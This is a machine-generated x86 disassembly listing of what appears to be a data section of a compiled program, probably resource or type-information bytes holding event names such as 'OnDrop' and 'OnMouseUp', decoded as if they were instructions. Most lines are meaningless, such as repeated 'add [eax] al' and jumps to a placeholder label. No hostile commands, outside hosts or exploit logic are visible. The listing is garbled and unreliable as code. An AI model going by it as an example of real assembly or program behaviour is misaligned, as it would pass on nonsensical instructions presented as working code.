jne r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
jo r-xdata
jb r-xdata
outsb
add [ edi + 0x1 ] ch
add bh bh
xor al 0xa6
add [ esi + 0x1 ] ch
add bh bh
sbb [ esi + 0x10043 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] eax
push es
dec esp
popad
jns r-xdata
adc [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
nop
xlat
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
inc [ ecx ]
inc ebx
outsd
outsb
je r-xdata
sbb al [ ecx ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
cmp [ esi + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
add bh bh
mov eax 0x10043a5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esp
outsd
arpl [ ebx - 0x24 ] bp
fld [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push ebp
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
inc esp
jb r-xdata
or cl [ edi + 0x6e ]
fadd [ ebx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
jo r-xdata
add [ edx + edi * 2 + 0x43 ] cl
jb r-xdata
add bh bh
js r-xdata
sbb al [ ecx ]
add [ ecx ] 0x0
inc [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
xor [ ecx ] 0x0
jb r-xdata
or al bl
inc ebx
add al bl
add [ eax ] al
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
jbe r-xdata
inc ebp
outsb
inc esp
jb r-xdata
and al 0xda
inc ebx
add [ eax ] cl
push eax
outsd
jo r-xdata
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
add [ eax ] bl
inc esi
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
outsd
add [ eax ] eax
push [ esi ]
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
add [ edx + 0x7a ] bh
inc ebx
add [ eax ] ah
add al [ eax ]
add al bh
in eax 0x43
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
and [ edx ] al
add [ eax ] al
clc
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
inc ebp
outsb
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
sbb al [ ecx ]
js r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
inc ebx
add [ eax ] ah
add al [ eax ]
add [ ecx + edi * 2 ] dl
inc ebx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
jpe r-xdata
add [ eax ] al
int3
arpl [ gs : esi + 0x6f ] cx
jb r-xdata
dec esp
popad
jbe r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
fiadd [ ebx ]
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x24 ] bp
fiadd [ ebx ]
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
call 0x2427739
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9427735
add [ eax ] al
inc [ ecx ]
sbb al [ ecx ]
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ eax + 0x640043ac ] ch
lodsd [ esi ]
inc ebx
add ah dl
lodsd [ esi ]
inc ebx
add [ edx + 0x62c00044 ] bh
inc esp
add [ eax + 0x61 ] bh
inc esp
add [ eax - 0x52 ] bh
inc ebx
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 - 0x57b3ffbc ] al
inc ebx
add [ eax + 0x440043aa ] cl
stosb [ edi ]
inc ebx
add [ esp + ebp * 4 ] cl
inc ebx
add [ eax + 0x680043aa ] bh
stosb [ edi ]
inc ebx
add [ ebx + ebp * 4 ] bl
inc ebx
add [ eax - 0x55 ] dh
inc ebx
add [ 0x69644554 ] al
je r-xdata
rcl [ eax ] 0x7c
inc ebx
add [ edi ] al
add eax 0x69644554
je r-xdata
add al 0x7c
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
aam 0x4b
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
add [ eax ] al
add al cl
js r-xdata
push ebx
je r-xdata
in al 0xdb
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
dec ecx
inc ecx
add [ eax + 0x46 ] bl
jb r-xdata
mov eax eax
pushad
jns r-xdata
movsb [ edi ] [ esi ]
sbb [ eax + eax + 0x40 ] al
sbb [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
jpo r-xdata
add [ eax - 0x63ffbfcb ] ah
scasd [ edi ]
inc ebx
add ah bl
xor al [ eax ]
clc
xor al [ eax ]
aam 0x4b
outsd
insd
inc ebp
imul esi [ fs : eax + 0x79 ] 0xe9ac0043
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ ecx + ecx * 2 + 0x46580041 ] dh
jb r-xdata
add [ eax ] cl
sahf
inc ecx
add [ eax - 0x63ffbfcb ] ah
scasd [ edi ]
inc ebx
add ah bl
xor al [ eax ]
clc
xor al [ eax ]
popad
jae r-xdata
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc eax
add ah dl
dec ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
cwde
0x10044 0x0
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4100437a ] cl
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
pushfd
cwde
inc esp
add ah al
pushad
insb
jae r-xdata
popad
jae r-xdata
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax + 0x42080013 ] al
insb
dec ecx
outsb
outsb
jb r-xdata
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
inc ebx
je r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax - 0x70470100 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
inc esp
inc esp
add ah al
pushad
inc ecx
add [ edi - 0x6c4fffbd ] ah
inc esp
add ah cl
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax + ebp * 4 + 0x43 ] ch
add [ eax + 0x19 ] bl
inc esp
add [ esp + 0x24240044 ] ch
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ eax + 0x640043ac ] ch
lodsd [ esi ]
inc ebx
add ah dl
lodsd [ esi ]
inc ebx
add [ edx + 0x62c00044 ] bh
inc esp
add [ eax + 0x61 ] bh
inc esp
add [ eax - 0x52 ] bh
inc ebx
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 - 0x57b3ffbc ] al
inc ebx
add [ eax + 0x440043aa ] cl
stosb [ edi ]
inc ebx
add [ esp + ebp * 4 ] cl
inc ebx
add [ eax + 0x680043aa ] bh
stosb [ edi ]
inc ebx
add [ ebx + ebp * 4 ] bl
inc ebx
add [ eax - 0x55 ] dh
inc ebx
add [ eax ] cl
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
aam 0xaf
inc ebx
add [ eax + esi * 4 ] dl
inc ebx
add [ eax + 0x480043b0 ] dl
mov al 0x43
add [ eax - 0x50 ] dh
inc ebx
add ah cl
mov al 0x43
add [ ecx + esi * 4 ] al
inc ebx
add [ eax - 0x51 ] bh
inc ebx
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
inc ecx
add [ eax ] bl
mov [ 0xffffffffa5400041 ] al
insb
jae r-xdata
mov ah 0x41
add [ edx + eax ] cl
add bh bh
sub [ eax + 0x10043 ] 0x0
add [ eax ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1065646f
jpo r-xdata
in eax 0x43
add [ ebp + 0x1 ] ah
add bh bh
or al 0x9b
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
in al 0x43
add [ ecx + eax ] ah
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
fcomp [ edx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
str [ edx ]
inc edx
jbe r-xdata
insb
jae r-xdata
add [ eax ] al
add [ esp + edi * 2 ] al
jpo r-xdata
shl [ eax + 0x79 ] 0x43
or eax [ ebx + 0x6f ]
jb r-xdata
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
[ eax + 0x100449a ]
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
add [ eax ] al
insb
dec edi
jne r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410a00
je r-xdata
add [ esi + edx * 8 ] ch
inc ebx
add [ ecx ] ah
add bh bh
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc eax
add ah dl
dec ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jl r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
je r-xdata
popad
jae r-xdata
add bh bh
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
in al 0x43
add [ ebx + 0x1 ] ah
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ edi - 0x6c4fffbd ] ah
inc esp
add ah cl
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax + ebp * 4 + 0x43 ] ch
add [ eax + 0x19 ] bl
inc esp
add [ esp + 0x24240044 ] ch
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc ecx
add [ eax + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3b00ffff ] ah
mov es [ eax + eax - 0x18 ]
mov es [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
inc esp
add [ eax ] al
insb
enter 0x4378 0x0
adc eax [ edx ]
add bh bh
movsb [ edi ] [ esi ]
test al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
in al dx
into
add [ eax ] dh
mov ah 0x41
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
inc esp
add [ ecx ] al
sbb [ ecx ] al
pop edi
add [ eax ] al
push [ eax ]
add dh bh
je r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ esp + ebp * 8 - 0x32 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc [ esi + 0x44 ]
jae r-xdata
adc [ eax ] al
adc [ edx ] eax
add bh bh
mov eax 0x10043a8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add al 0xe4
inc ebx
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
pop ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
xchg esp eax
in al 0x43
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070020 ] al
insd
dec esi
popad
insd
push esp
adc [ eax ] al
or [ edx ] al
add bh bh
int3
add [ esi + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
outsb
je r-xdata
add bh bh
inc esp
inc esp
jb r-xdata
add eax 0x16ff0000
add [ 0x6f6c6f43 ] al
jb r-xdata
aad 0x43
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
outsd
salc
inc ebx
add [ eax + eax ] dh
push [ eax + 0x4a ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
sub_4377ec
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
jbe r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax ] al
add al cl
js r-xdata
in al 0xdb
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
or al 0x4f
outsb
dec ebp
outsd
jne r-xdata
nop
xlat
inc ebx
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
jpe r-xdata
add [ eax ] cl
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
arpl [ gs : esi + 0x6f ] cx
jb r-xdata
dec esp
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
add [ edx + 0x7a ] bh
inc ebx
add [ eax ] ah
add al [ eax ]
add al bh
aam 0x4b
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
dec ecx
inc ecx
add [ eax + 0x46 ] bl
jb r-xdata
mov eax eax
pushad
jns r-xdata
inc esp
outsd
arpl [ ebx - 0x24 ] bp
fld [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
inc ebx
add [ eax ] ah
add al [ eax ]
add [ ecx + edi * 2 ] dl
inc ebx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
je r-xdata
add [ ecx + ecx * 2 + 0x46580041 ] dh
jb r-xdata
sahf
inc ecx
add [ eax - 0x63ffbfcb ] ah
scasd [ edi ]
inc ebx
add ah bl
xor al [ eax ]
clc
xor al [ eax ]
popad
jae r-xdata
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc eax
add ah dl
dec ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 + 0x43 ] cl
jb r-xdata
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ eax + 0x640043ac ] ch
lodsd [ esi ]
inc ebx
add ah dl
lodsd [ esi ]
inc ebx
add [ edx + 0x62c00044 ] bh
inc esp
add [ eax + 0x61 ] bh
inc esp
add [ eax - 0x52 ] bh
inc ebx
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 - 0x57b3ffbc ] al
inc ebx
add [ eax + 0x440043aa ] cl
stosb [ edi ]
inc ebx
add [ esp + ebp * 4 ] cl
inc ebx
add [ eax + 0x680043aa ] bh
stosb [ edi ]
inc ebx
add [ ebx + ebp * 4 ] bl
inc ebx
add [ eax - 0x55 ] dh
inc ebx
add [ 0x69644554 ] al
je r-xdata
rcl [ eax ] 0x7c
inc ebx
add [ edi ] al
add eax 0x69644554
je r-xdata
add al 0x7c
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
in eax 0x43
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
popad
jae r-xdata
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
and [ edx ] al
add [ eax ] al
clc
inc esp
jb r-xdata
movsb [ edi ] [ esi ]
sbb [ eax + eax + 0x40 ] al
sbb [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
jpo r-xdata
add [ eax - 0x63ffbfcb ] ah
scasd [ edi ]
inc ebx
add ah bl
xor al [ eax ]
clc
xor al [ eax ]
aam 0x4b
outsd
insd
inc ebp
imul esi [ fs : eax + 0x79 ] 0xe9ac0043
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc esp
inc esp
add ah al
pushad
inc ecx
add [ edi - 0x6c4fffbd ] ah
inc esp
add ah cl
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax + ebp * 4 + 0x43 ] ch
add [ eax + 0x19 ] bl
inc esp
add [ esp + 0x24240044 ] ch
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ eax + 0x640043ac ] ch
lodsd [ esi ]
inc ebx
add ah dl
lodsd [ esi ]
inc ebx
add [ edx + 0x62c00044 ] bh
inc esp
add [ eax + 0x61 ] bh
inc esp
add [ eax - 0x52 ] bh
inc ebx
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 - 0x57b3ffbc ] al
inc ebx
add [ eax + 0x440043aa ] cl
stosb [ edi ]
inc ebx
add [ esp + ebp * 4 ] cl
inc ebx
add [ eax + 0x680043aa ] bh
stosb [ edi ]
inc ebx
add [ ebx + ebp * 4 ] bl
inc ebx
add [ eax - 0x55 ] dh
inc ebx
add [ eax ] cl
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
aam 0xaf
inc ebx
add [ eax + esi * 4 ] dl
inc ebx
add [ eax + 0x480043b0 ] dl
mov al 0x43
add [ eax - 0x50 ] dh
inc ebx
add ah cl
mov al 0x43
add [ ecx + esi * 4 ] al
inc ebx
add [ eax - 0x51 ] bh
inc ebx
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
inc ecx
add [ eax ] bl
mov [ 0xffffffffa5400041 ] al
insb
jae r-xdata
add [ eax ] al
int3
add bh bh
cwde
0x10044 0x0
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4100437a ] cl
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
pushfd
cwde
inc esp
add ah al
pushad
insb
jae r-xdata
shl [ eax + 0x79 ] 0x43
add [ eax + 0x42080013 ] al
insb
dec ecx
outsb
outsb
jb r-xdata
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
inc ebx
je r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax - 0x70470100 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
mov ah 0x41
add [ edx + eax ] cl
add bh bh
sub [ eax + 0x10043 ] 0x0
add [ eax ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1065646f
jpo r-xdata
in eax 0x43
add [ ebp + 0x1 ] ah
add bh bh
or al 0x9b
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
in al 0x43
add [ ecx + eax ] ah
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
fcomp [ edx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
str [ edx ]
inc edx
jbe r-xdata
insb
jae r-xdata
add [ eax ] al
add [ esp + edi * 2 ] al
jpo r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
[ eax + 0x100449a ]
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
add [ eax ] al
insb
dec edi
jne r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410a00
je r-xdata
add [ esi + edx * 8 ] ch
inc ebx
add [ ecx ] ah
add bh bh
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc eax
add ah dl
dec ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jl r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
